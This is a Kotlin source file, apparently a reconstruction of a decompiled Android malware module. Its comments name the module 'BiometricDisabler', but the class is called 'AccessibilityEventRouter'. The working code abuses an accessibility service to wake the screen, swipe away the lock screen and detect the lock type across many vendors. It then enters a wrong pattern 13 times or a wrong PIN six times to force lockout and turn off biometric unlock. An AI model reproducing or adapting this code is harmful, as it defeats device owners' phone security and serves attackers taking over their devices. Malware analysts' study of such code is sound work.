package com.storm.safe.rock.service.modules

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Context
import android.graphics.Path
import android.graphics.Point
import android.graphics.Rect
import android.os.PowerManager
import android.util.Log
import android.view.WindowManager
import android.view.accessibility.AccessibilityNodeInfo
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlin.coroutines.resume

/**
 * BiometricDisabler — handles PIN/pattern lock bypass via accessibility gestures.
 *
 * Reverse-engineered from JADX: C0317a2 (a2, 914 lines).
 * Renamed: a0→detectLockType, a1→findPatternViewAndExecute, a2→executePinLock,
 *          a3→swipeUp, a4→wakeScreen, a5→clickNode, a6→clickPinDigit,
 *          a7→disableBiometric, a8→executePatternGesture, a9→patternCellX,
 *          b0→patternCellY, b1→findLargeSquareNode, b2→findNodeByClassName,
 *          b3→findNodeByText, b4→containsTextInTree, b5→inputWrongPin, b6→clickXY
 *
 * JADX class name: BiometricDisabler (C0317a2)
 * JADX fields:
 *   f53041a0 — dqtvuisjd (service ref for gestures/root node)
 *   f53042a1 — dqtvuisjd (service ref for screen size / context)
 *   f53043a2 — C0873ms (CoroutineScope, main dispatcher)
 *   f53044a3 — volatile boolean (isExecuting guard)
 */
class AccessibilityEventRouter(
    /** JADX: f53041a0 — service for getRootInActiveWindow/dispatchGesture */
    private val service: AccessibilityService,
    /** JADX: f53042a1 — context for screen size queries */
    private val context: Context
) {

    /** Lock screen type detected by examining root node. JADX: BiometricDisabler$LockType */
    enum class LockType {
        PATTERN,  // f52736a1
        PIN,      // f52735a0
        UNKNOWN   // f52737a2
    }

    companion object {
        private const val TAG = "BiometricDisabler"

        /** Pattern view resource IDs to search for. JADX: a1 method strArr (16 entries) */
        val PATTERN_VIEW_IDS = arrayOf(
            "com.android.systemui:id/lockPatternView",
            "com.android.keyguard:id/lockPatternView",
            "android:id/lockPatternView",
            "com.coloros.keyguard:id/lockPatternView",
            "com.oppo.keyguard:id/lockPatternView",
            "com.coloros.keyguard:id/pattern_view",
            "com.oppo.keyguard:id/pattern_view",
            "com.android.systemui:id/pattern_view",
            "com.vivo.keyguard:id/lockPatternView",
            "com.bbk.keyguard:id/lockPatternView",
            "com.miui.keyguard:id/lockPatternView",
            "com.huawei.keyguard:id/lockPatternView",
            "com.samsung.android.keyguard:id/lockPatternView",
            "pattern_view",
            "patternView",
            "lock_pattern"
        )

        /** PIN entry resource IDs. JADX: a0 method (detect PIN lock type) */
        val PIN_ENTRY_IDS = arrayOf(
            "com.android.systemui:id/pinEntry",
            "com.android.systemui:id/key0",
            "com.android.systemui:id/key1",
            "com.android.keyguard:id/pinEntry"
        )

        /** PIN enter/confirm button IDs. JADX: a2 method strArr */
        val PIN_ENTER_IDS = arrayOf(
            "com.android.systemui:id/key_enter",
            "com.android.systemui:id/ok_button",
            "com.android.keyguard:id/key_enter"
        )

        /** Pattern lock class names to search by className. JADX: a1 call to b2 */
        val PATTERN_CLASS_NAMES = arrayOf(
            "com.android.internal.widget.LockPatternView",
            "android.widget.LockPatternView",
            "com.oppo.widget.LockPatternView",
            "com.coloros.widget.LockPatternView"
        )

        /** PIN key button ID prefixes for digit lookup. JADX: b5 method */
        val PIN_KEY_PREFIXES = arrayOf(
            "com.android.systemui:id/key",
            "com.android.keyguard:id/key"
        )

        /** Pattern lock detection IDs (short list for detectLockType). JADX: a0 method */
        private val DETECT_PATTERN_IDS = arrayOf(
            "com.android.systemui:id/lockPatternView",
            "com.android.keyguard:id/lockPatternView",
            "android:id/lockPatternView"
        )

        // JADX: dh0.f55773c3 + dh0.f55779c9 + dh0.f55772c2 → confirm button text strings
        // JADX: dh0.f55775c5 → alternative confirm button text strings
        // ADAPT: Using "✓" as the primary confirm button text indicator

        /** PIN lock repetitions. JADX: a2 loop runs i=1..6 (6 times) */
        private const val PIN_LOCK_ROUNDS = 6

        /** Pattern gesture repetitions. JADX: a8 loop runs i=1..13 (13 times) */
        private const val PATTERN_GESTURE_ROUNDS = 13

        /** Pattern gesture duration (ms). JADX: a8 StrokeDescription(path, 0, 800) */
        private const val PATTERN_GESTURE_DURATION_MS = 800L

        /** Click gesture offset/duration (ms). JADX: b6 StrokeDescription(path, 10, 50) */
        private const val CLICK_GESTURE_START_MS = 10L
        private const val CLICK_GESTURE_DURATION_MS = 50L

        /** Swipe gesture duration (ms). JADX: a3 StrokeDescription(path, 0, 300) */
        private const val SWIPE_GESTURE_DURATION_MS = 300L

        /** WakeLock timeout (ms). JADX: a4 acquire(3000) */
        private const val WAKELOCK_TIMEOUT_MS = 3000L

        /** WakeLock tag. JADX: a4 "BiometricDisabler:WakeLock" */
        private const val WAKELOCK_TAG = "BiometricDisabler:WakeLock"

        /** WakeLock flags. JADX: a4 805306378
         * = ACQUIRE_CAUSES_WAKEUP | ON_AFTER_RELEASE | SCREEN_BRIGHT_WAKE_LOCK | FULL_WAKE_LOCK */
        private const val WAKELOCK_FLAGS = 805306378

        // ── Static utility methods ──

        /** Calculate X coordinate for pattern grid cell. JADX: a9 */
        @JvmStatic
        fun patternCellX(left: Float, cellWidth: Float, col: Int): Float {
            return (cellWidth / 2.0f) + (col * cellWidth) + left
        }

        /** Calculate Y coordinate for pattern grid cell. JADX: b0 */
        @JvmStatic
        fun patternCellY(top: Float, cellHeight: Float, row: Int): Float {
            return (cellHeight / 2.0f) + (row * cellHeight) + top
        }

        /**
         * Map digit (0-9) to grid position (col, row).
         * JADX: a6 switch statement.
         *
         * PIN pad layout:
         * ```
         * [1] [2] [3]    row 0
         * [4] [5] [6]    row 1
         * [7] [8] [9]    row 2
         *     [0]         row 3
         * ```
         */
        @JvmStatic
        fun digitToGridPosition(digit: Int): Pair<Int, Int> {
            return when (digit) {
                0 -> Pair(1, 3)
                1 -> Pair(0, 0)
                2 -> Pair(1, 0)
                3 -> Pair(2, 0)
                4 -> Pair(0, 1)
                5 -> Pair(1, 1)
                6 -> Pair(2, 1)
                7 -> Pair(0, 2)
                8 -> Pair(1, 2)
                9 -> Pair(2, 2)
                else -> Pair(1, 0) // JADX: default case
            }
        }

        /**
         * Find node by className recursively. JADX: b2
         * Matches by: exact class name, ends with "LockPatternView", or ends with "PatternView".
         */
        @JvmStatic
        fun findNodeByClassName(node: AccessibilityNodeInfo?, classNames: Array<String>): AccessibilityNodeInfo? {
            if (node == null) return null
            try {
                val className = node.className?.toString() ?: ""
                for (name in classNames) {
                    // JADX: AbstractC0779a1.m213652a5 (contains, ignoreCase)
                    //        || m213655a8 "LockPatternView" || m213655a8 "PatternView"
                    if (className.contains(name, ignoreCase = true) ||
                        className.endsWith("LockPatternView", ignoreCase = true) ||
                        className.endsWith("PatternView", ignoreCase = true)
                    ) {
                        return node
                    }
                }
                for (i in 0 until node.childCount) {
                    val child = node.getChild(i) ?: continue
                    val found = findNodeByClassName(child, classNames)
                    if (found != null) return found
                }
            } catch (_: Exception) {}
            return null
        }

        /**
         * Find node by text content. JADX: b3
         * Matches trimmed text exactly; node must be clickable.
         */
        @JvmStatic
        fun findNodeByText(node: AccessibilityNodeInfo?, text: String): AccessibilityNodeInfo? {
            if (node == null) return null
            try {
                // JADX: AbstractC0779a1.m213687e0 = trim()
                val nodeText = node.text?.toString()?.trim() ?: ""
                if (nodeText == text && node.isClickable) return node
                for (i in 0 until node.childCount) {
                    val child = node.getChild(i) ?: continue
                    val found = findNodeByText(child, text)
                    if (found != null) return found
                }
            } catch (_: Exception) {}
            return null
        }

        /**
         * Check if any text in tree matches given strings. JADX: b4
         * Searches both text and contentDescription, up to depth 20.
         */
        @JvmStatic
        fun containsTextInTree(node: AccessibilityNodeInfo?, targets: Array<String>, depth: Int): Boolean {
            if (node == null || depth > 20) return false
            try {
                val text = node.text?.toString() ?: ""
                val desc = node.contentDescription?.toString() ?: ""
                for (target in targets) {
                    // JADX: AbstractC0779a1.m213652a5 (contains, ignoreCase = true)
                    if (text.contains(target, ignoreCase = true) ||
                        desc.contains(target, ignoreCase = true)
                    ) {
                        return true
                    }
                }
                for (i in 0 until node.childCount) {
                    val child = node.getChild(i) ?: continue
                    if (containsTextInTree(child, targets, depth + 1)) return true
                }
            } catch (_: Exception) {}
            return false
        }
    }

    // ═══════════════════════════════════════════════════
    // Instance fields
    // ═══════════════════════════════════════════════════

    /** JADX: f53043a2 — CoroutineScope on main dispatcher.
     * Vendor: AbstractC1117qo.m214407a0(AbstractC0775a0.m213638a1(c0785a0, y21Var)) */
    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())

    /** JADX: f53044a3 — re-entry guard for disableBiometric */
    @Volatile
    private var _isExecuting: Boolean = false

    // ═══════════════════════════════════════════════════
    // Public accessors for isExecuting flag
    // ═══════════════════════════════════════════════════

    fun isExecuting(): Boolean = _isExecuting

    fun setExecuting(value: Boolean) {
        _isExecuting = value
    }

    // ═══════════════════════════════════════════════════
    // a0 → detectLockType
    // Checks root node for pattern/PIN lock indicators.
    // Returns LockType.PATTERN, PIN, or UNKNOWN.
    // ═══════════════════════════════════════════════════

    fun detectLockType(rootNode: AccessibilityNodeInfo?): LockType {
        val fallback = LockType.UNKNOWN // JADX: biometricDisabler$LockType = f52737a2
        if (rootNode == null) return fallback
        try {
            // Phase 1: Check pattern view IDs (short list)
            for (id in DETECT_PATTERN_IDS) {
                val nodes = rootNode.findAccessibilityNodeInfosByViewId(id)
                if (nodes != null && nodes.isNotEmpty()) {
                    return LockType.PATTERN // JADX: f52736a1
                }
            }

            // Phase 2: Check PIN entry IDs
            for (id in PIN_ENTRY_IDS) {
                val nodes = rootNode.findAccessibilityNodeInfosByViewId(id)
                if (nodes != null && nodes.isNotEmpty()) {
                    return LockType.PIN // JADX: f52735a0
                }
            }

            // Phase 3: Check for confirm button texts (dh0.f55773c3 + c9 + c2)
            // JADX: if containsTextInTree with confirm strings → PIN
            // ADAPT: Using "✓" as confirm indicator; vendor uses encrypted string lists
            if (containsTextInTree(rootNode, arrayOf("✓"), 0)) {
                return LockType.PIN
            }

            // Phase 4: Check for alternative confirm texts (dh0.f55775c5)
            // ADAPT: vendor checks additional encrypted strings — stub
        } catch (e: Exception) {
            Log.e(TAG, "检测锁屏类型失败", e)
        }
        return fallback
    }

    // ═══════════════════════════════════════════════════
    // a5 → clickNode
    // Gets bounds → center → dispatches tap gesture.
    // ═══════════════════════════════════════════════════

    fun clickNode(node: AccessibilityNodeInfo) {
        try {
            val rect = Rect()
            node.getBoundsInScreen(rect)
            if (rect.width() <= 0 || rect.height() <= 0) return
            clickXY(rect.centerX().toFloat(), rect.centerY().toFloat())
        } catch (e: Exception) {
            Log.e(TAG, "点击节点失败", e)
        }
    }

    // ═══════════════════════════════════════════════════
    // b6 → clickXY
    // Dispatches a tap gesture at (x, y) via dispatchGesture.
    // JADX: StrokeDescription(path, 10, 50)
    // ═══════════════════════════════════════════════════

    fun clickXY(x: Float, y: Float) {
        try {
            val path = Path()
            path.moveTo(x, y)
            service.dispatchGesture(
                GestureDescription.Builder()
                    .addStroke(GestureDescription.StrokeDescription(path, CLICK_GESTURE_START_MS, CLICK_GESTURE_DURATION_MS))
                    .build(),
                null,
                null
            )
        } catch (e: Exception) {
            Log.e(TAG, "点击手势失败", e)
        }
    }

    // ═══════════════════════════════════════════════════
    // a6 → clickPinDigit
    // Maps digit to grid position, then calls clickXY.
    // JADX: uses screen size from service context.
    // ═══════════════════════════════════════════════════

    fun clickPinDigit(digit: Int) {
        val screenSize = getScreenSize()
        val screenWidth = screenSize.x.toFloat()
        val screenHeight = screenSize.y.toFloat()

        // JADX: f = 0.45f * screenHeight (top offset for numpad area)
        val topOffset = 0.45f * screenHeight
        // JADX: f2 = screenWidth / 3.0f (column width)
        val colWidth = screenWidth / 3.0f
        // JADX: f3 = (screenHeight * 0.4f) / 4.0f (row height)
        val rowHeight = (screenHeight * 0.4f) / 4.0f

        val (col, row) = digitToGridPosition(digit)

        // JADX: m211565b6((colWidth * 0.5f) + (col * colWidth), (rowHeight * 0.5f) + (row * rowHeight) + topOffset)
        val x = (colWidth * 0.5f) + (col * colWidth)
        val y = (rowHeight * 0.5f) + (row * rowHeight) + topOffset
        clickXY(x, y)
    }

    // ═══════════════════════════════════════════════════
    // a3 → swipeUp
    // Dispatches a vertical swipe from bottom to top.
    // JADX: center X, from 0.75*height to 0.1*height
    // ═══════════════════════════════════════════════════

    fun swipeUp() {
        try {
            val screenSize = getScreenSize()
            val centerX = screenSize.x / 2.0f
            val screenHeight = screenSize.y.toFloat()

            val path = Path()
            path.moveTo(centerX, 0.75f * screenHeight)
            path.lineTo(centerX, screenHeight * 0.1f)

            service.dispatchGesture(
                GestureDescription.Builder()
                    .addStroke(GestureDescription.StrokeDescription(path, 0L, SWIPE_GESTURE_DURATION_MS))
                    .build(),
                // JADX: new C0429du(0) — a no-op callback
                null,
                null
            )
        } catch (e: Exception) {
            Log.e(TAG, "上滑手势失败", e)
        }
    }

    // ═══════════════════════════════════════════════════
    // a4 → wakeScreen
    // Acquires a WakeLock briefly to turn on the screen.
    // JADX: 805306378 flags, 3000ms timeout
    // ═══════════════════════════════════════════════════

    fun wakeScreen() {
        try {
            // JADX: ReflectApi.INSTANCE.getSystemService(context, "power")
            val systemService = context.getSystemService(Context.POWER_SERVICE)
            val powerManager = systemService as? PowerManager ?: return
            @Suppress("DEPRECATION")
            val wakeLock = powerManager.newWakeLock(WAKELOCK_FLAGS, WAKELOCK_TAG)
            wakeLock.acquire(WAKELOCK_TIMEOUT_MS)
            wakeLock.release()
        } catch (e: Exception) {
            Log.e(TAG, "唤醒屏幕失败", e)
        }
    }

    // ═══════════════════════════════════════════════════
    // a7 → disableBiometric
    // Entry point. Guards against re-entry, launches coroutine.
    // JADX: if isExecuting → callback("正在执行中"); else launch scope
    // ═══════════════════════════════════════════════════

    fun disableBiometric(callback: ((String) -> Unit)?) {
        if (_isExecuting) {
            Log.w(TAG, "⚠️ 正在执行中，忽略重复请求")
            callback?.invoke("正在执行中")
            return
        }
        // JADX: AbstractC0780a0.m213692a3(scope, null, BiometricDisabler$disableBiometric$1(this, callback), 3)
        scope.launch {
            try {
                _isExecuting = true
                // JADX: BiometricDisabler$disableBiometric$1 coroutine body
                // 1. Wake screen
                wakeScreen()
                delay(500)

                // 2. Swipe up to dismiss lock screen
                swipeUp()
                delay(1000)

                // 3. Detect lock type
                val root = service.rootInActiveWindow
                val lockType = detectLockType(root)
                Log.d(TAG, "🔐 检测到锁屏类型: $lockType")

                // 4. Execute appropriate bypass
                when (lockType) {
                    LockType.PATTERN -> {
                        findPatternViewAndExecute()
                    }
                    LockType.PIN -> {
                        executePinLock()
                    }
                    LockType.UNKNOWN -> {
                        Log.w(TAG, "⚠️ 未知锁屏类型，尝试图案+PIN双路径")
                        // ADAPT: vendor tries pattern first, then PIN as fallback
                        findPatternViewAndExecute()
                        delay(1000)
                        executePinLock()
                    }
                }

                callback?.invoke("完成")
            } catch (e: Exception) {
                Log.e(TAG, "❌ 生物识别禁用失败", e)
                callback?.invoke("失败: ${e.message}")
            } finally {
                _isExecuting = false
            }
        }
    }

    // ═══════════════════════════════════════════════════
    // a1 → findPatternViewAndExecute (suspend)
    // Finds pattern lock view and executes pattern gesture.
    // Search order: resource IDs → class names → large square heuristic → screen ratio fallback
    // ═══════════════════════════════════════════════════

    suspend fun findPatternViewAndExecute() {
        var patternRect: Rect? = null
        try {
            val root = service.rootInActiveWindow
            if (root != null) {
                // Phase 1: Search by resource IDs (16 entries)
                for (id in PATTERN_VIEW_IDS) {
                    val nodes = root.findAccessibilityNodeInfosByViewId(id)
                    if (nodes != null && nodes.isNotEmpty()) {
                        val rect = Rect()
                        nodes[0].getBoundsInScreen(rect)
                        if (rect.width() > 100 && rect.height() > 100) {
                            Log.d(TAG, "✅ 通过资源ID找到图案锁视图: $id, rect=$rect")
                            patternRect = rect
                            break
                        }
                    }
                }

                // Phase 2: Search by class name
                if (patternRect == null) {
                    val nodeByClass = findNodeByClassName(root, PATTERN_CLASS_NAMES)
                    if (nodeByClass != null) {
                        val rect = Rect()
                        nodeByClass.getBoundsInScreen(rect)
                        if (rect.width() > 100 && rect.height() > 100) {
                            Log.d(TAG, "✅ 通过类名找到图案锁视图: rect=$rect")
                            patternRect = rect
                        } else {
                            // Phase 3: Large square heuristic (b1)
                            val squareNode = findLargeSquareNode(root)
                            if (squareNode != null) {
                                val squareRect = Rect()
                                squareNode.getBoundsInScreen(squareRect)
                                Log.d(TAG, "✅ 通过大面积正方形区域找到可能的图案锁: rect=$squareRect")
                                patternRect = squareRect
                            } else {
                                Log.w(TAG, "⚠️ 未能通过任何方式找到图案锁视图")
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "查找图案锁视图失败", e)
        }

        // Phase 4: Screen ratio fallback
        if (patternRect == null) {
            Log.w(TAG, "⚠️ 未找到图案锁视图，使用屏幕比例计算")
            val screenSize = getScreenSize()
            val screenWidth = screenSize.x.toFloat()
            val screenHeight = screenSize.y.toFloat()
            // JADX: left = 0.12 * width, top = 0.4 * height
            //       w = 0.88*width - left, h = 0.7*height - top
            val left = 0.12f * screenWidth
            val top = 0.4f * screenHeight
            val w = (screenWidth * 0.88f) - left
            val h = (screenHeight * 0.7f) - top
            Log.d(TAG, "📐 图案锁区域计算: left=$left, top=$top, width=$w, height=$h")
            executePatternGesture(left, top, w, h)
        } else {
            executePatternGesture(
                patternRect.left.toFloat(),
                patternRect.top.toFloat(),
                patternRect.width().toFloat(),
                patternRect.height().toFloat()
            )
        }
    }

    // ═══════════════════════════════════════════════════
    // a8 → executePatternGesture (suspend)
    // Draws pattern 1-2-3-5-7 (5-point path), repeats 13 times.
    // JADX: a8(float f, float f2, float f3, float f4, ContinuationImpl)
    // ═══════════════════════════════════════════════════

    suspend fun executePatternGesture(left: Float, top: Float, width: Float, height: Float) {
        val cellW = width / 3.0f
        val cellH = height / 3.0f

        // Build the 1-2-3-5-7 pattern path
        // JADX: moveTo(a9(f,f5,0), b0(f2,f6,0)) → lineTo(1,0) → (2,0) → (1,1) → (0,2)
        val path = Path()
        path.moveTo(patternCellX(left, cellW, 0), patternCellY(top, cellH, 0))  // Point 1 (0,0)
        path.lineTo(patternCellX(left, cellW, 1), patternCellY(top, cellH, 0))  // Point 2 (1,0)
        path.lineTo(patternCellX(left, cellW, 2), patternCellY(top, cellH, 0))  // Point 3 (2,0)
        path.lineTo(patternCellX(left, cellW, 1), patternCellY(top, cellH, 1))  // Point 5 (1,1)
        path.lineTo(patternCellX(left, cellW, 0), patternCellY(top, cellH, 2))  // Point 7 (0,2)

        Log.d(TAG, "📐 图案路径 1-2-3-5-7: 点1(${patternCellX(left, cellW, 0)},${patternCellY(top, cellH, 0)}) " +
            "-> 点2(${patternCellX(left, cellW, 1)},${patternCellY(top, cellH, 0)}) " +
            "-> 点3(${patternCellX(left, cellW, 2)},${patternCellY(top, cellH, 0)}) " +
            "-> 点5(${patternCellX(left, cellW, 1)},${patternCellY(top, cellH, 1)}) " +
            "-> 点7(${patternCellX(left, cellW, 0)},${patternCellY(top, cellH, 2)})")

        // Repeat pattern 13 times
        for (i in 1..PATTERN_GESTURE_ROUNDS) {
            Log.v(TAG, "🔲 执行图案 1-2-3-5-7 第 $i/$PATTERN_GESTURE_ROUNDS 次")
            try {
                dispatchPatternGesture(path)
            } catch (e: Exception) {
                Log.e(TAG, "图案手势失败", e)
            }
            delay(1000) // JADX: b81.m210571b1(1000L, ...)
        }
        Log.d(TAG, "✅ 图案锁执行完成，共 $PATTERN_GESTURE_ROUNDS 次")
    }

    /**
     * Dispatch a single pattern gesture and await completion.
     * JADX: Uses C0530gb (CompletableDeferred) + GestureResultCallbackA1.
     * ADAPT: Uses suspendCancellableCoroutine with GestureResultCallbackA1.
     */
    private suspend fun dispatchPatternGesture(path: Path) {
        try {
            suspendCancellableCoroutine<Boolean> { cont ->
                val callback = GestureResultCallbackA1(cont)
                service.dispatchGesture(
                    GestureDescription.Builder()
                        .addStroke(GestureDescription.StrokeDescription(path, 0L, PATTERN_GESTURE_DURATION_MS))
                        .build(),
                    callback,
                    null
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "图案手势失败", e)
        }
    }

    // ═══════════════════════════════════════════════════
    // a2 → executePinLock (suspend)
    // Enters wrong PIN 6 times to trigger lockout.
    // Each round: inputWrongPin() → try confirm button → delay(500)
    // ═══════════════════════════════════════════════════

    suspend fun executePinLock() {
        for (i in 1..PIN_LOCK_ROUNDS) {
            Log.v(TAG, "🔢 执行PIN输入 第 $i/$PIN_LOCK_ROUNDS 次")

            // Step 1: Input wrong PIN
            inputWrongPin()

            // Step 2: Try pressing enter/confirm button
            try {
                val root = service.rootInActiveWindow
                if (root != null) {
                    var confirmed = false
                    for (id in PIN_ENTER_IDS) {
                        val nodes = root.findAccessibilityNodeInfosByViewId(id)
                        if (nodes != null && nodes.isNotEmpty()) {
                            clickNode(nodes[0])
                            confirmed = true
                            break
                        }
                    }

                    // JADX: If no confirm button by ID, search for "✓" text + additional confirm strings
                    if (!confirmed) {
                        // ADAPT: Vendor searches for confirm button text from encrypted string lists
                        // then falls back to coordinate-based click at (0.83*width, 0.78*height)
                        try {
                            val confirmTexts = arrayOf("✓") // ADAPT: dh0.f55752a2 + "✓"
                            for (text in confirmTexts) {
                                val found = findNodeByText(root, text)
                                if (found != null && found.isClickable) {
                                    clickNode(found)
                                    confirmed = true
                                    break
                                }
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "点击确认按钮失败", e)
                        }

                        if (!confirmed) {
                            // JADX: Coordinate fallback — click at (0.83*width, 0.78*height)
                            val screenSize = getScreenSize()
                            clickXY(
                                screenSize.x.toFloat() * 0.83f,
                                screenSize.y.toFloat() * 0.78f
                            )
                        }
                    }
                }
            } catch (_: Exception) {}

            // Step 3: Delay between rounds
            delay(500) // JADX: b81.m210571b1(500L, ...)

            // JADX: After round 6, additional delay
            if (i < PIN_LOCK_ROUNDS) {
                delay(1000) // JADX: b81.m210571b1(1000L, ...)
            }
        }
        Log.d(TAG, "✅ PIN锁执行完成，共 $PIN_LOCK_ROUNDS 次")
    }

    // ═══════════════════════════════════════════════════
    // b5 → inputWrongPin (suspend)
    // Enters digits 1-6 by:
    //   1. Resource ID lookup (key1..key6)
    //   2. Text-based node search
    //   3. Coordinate fallback (clickPinDigit)
    // ═══════════════════════════════════════════════════

    suspend fun inputWrongPin() {
        var root: AccessibilityNodeInfo? = null
        try {
            root = service.rootInActiveWindow
            // JADX: enters digits 1 through 6
            for (digit in 1..6) {
                var clicked = false

                // Strategy 1: Find by resource ID (key1, key2, ... key6)
                if (root != null) {
                    for (prefix in PIN_KEY_PREFIXES) {
                        val nodes = root.findAccessibilityNodeInfosByViewId("$prefix$digit")
                        if (nodes != null && nodes.isNotEmpty()) {
                            clickNode(nodes[0])
                            clicked = true
                            break
                        }
                    }
                }

                // Strategy 2: Find by text content
                if (!clicked && root != null) {
                    val digitStr = digit.toString()
                    val found = findNodeByText(root, digitStr)
                    if (found != null) {
                        clickNode(found)
                        clicked = true
                    }
                }

                // Strategy 3: Coordinate fallback
                if (!clicked) {
                    clickPinDigit(digit)
                }

                // JADX: delay(200) between digits
                delay(200)
            }
        } catch (e: Exception) {
            Log.e(TAG, "输入PIN失败", e)
        } finally {
            try {
                root?.recycle()
            } catch (_: Exception) {}
        }
    }

    // ═══════════════════════════════════════════════════
    // b1 → findLargeSquareNode
    // Recursively searches for a large, roughly-square node
    // in the middle of the screen (pattern lock heuristic).
    // JADX: width > 0.5*screenWidth, height > 0.5*screenWidth,
    //       ratio 0.7-1.3, centerY in [0.3*screenH, 0.8*screenH]
    // ═══════════════════════════════════════════════════

    fun findLargeSquareNode(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        try {
            val screenSize = getScreenSize()
            val screenWidth = screenSize.x
            val screenHeight = screenSize.y
            val minSize = screenWidth * 0.5f

            val rect = Rect()
            node.getBoundsInScreen(rect)
            val w = rect.width().toFloat()
            val h = rect.height().toFloat()

            if (w > minSize && h > minSize) {
                val ratio = w / h
                if (ratio in 0.7f..1.3f) {
                    val centerY = rect.centerY().toFloat()
                    val sh = screenHeight.toFloat()
                    if (centerY > 0.3f * sh && centerY < 0.8f * sh) {
                        Log.v(TAG, "🔍 找到候选图案锁区域: $rect, ratio=$ratio")
                        return node
                    }
                }
            }

            // Search children
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                val found = findLargeSquareNode(child)
                if (found != null) return found
            }
        } catch (_: Exception) {}
        return null
    }

    // ═══════════════════════════════════════════════════
    // Utility: getScreenSize
    // JADX: kj1.m213572b9(context) returns Pair(width, height)
    // ═══════════════════════════════════════════════════

    private fun getScreenSize(): Point {
        val point = Point()
        try {
            val wm = context.getSystemService(Context.WINDOW_SERVICE) as? WindowManager
            if (wm != null) {
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                    val bounds = wm.currentWindowMetrics.bounds
                    point.x = bounds.width()
                    point.y = bounds.height()
                } else {
                    @Suppress("DEPRECATION")
                    val display = wm.defaultDisplay
                    @Suppress("DEPRECATION")
                    display?.getSize(point)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "获取屏幕尺寸失败", e)
        }
        return point
    }

    // ═══════════════════════════════════════════════════
    // dispose
    // Cancels coroutine scope on cleanup.
    // ═══════════════════════════════════════════════════

    fun dispose() {
        try {
            scope.cancel()
        } catch (_: Exception) {}
    }
}
